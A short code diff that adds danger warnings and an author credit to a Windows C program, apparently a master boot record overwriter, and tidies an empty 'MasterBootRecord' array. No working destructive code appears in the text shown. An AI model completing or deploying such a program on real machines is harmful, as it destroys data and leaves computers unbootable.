@@ -1,6 +1,8 @@
+// this is very dangerous do not run this on your host computer this may damage your computer seriously!
+// this was written by Maruf132
 #include <windows.h>
 
-const unsigned char MasterBootRecord[] = {}; 
+const unsigned char MasterBootRecord[] = {};
 int CALLBACK WinMain(
     HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPSTR     lpCmdLine, int       nCmdShow
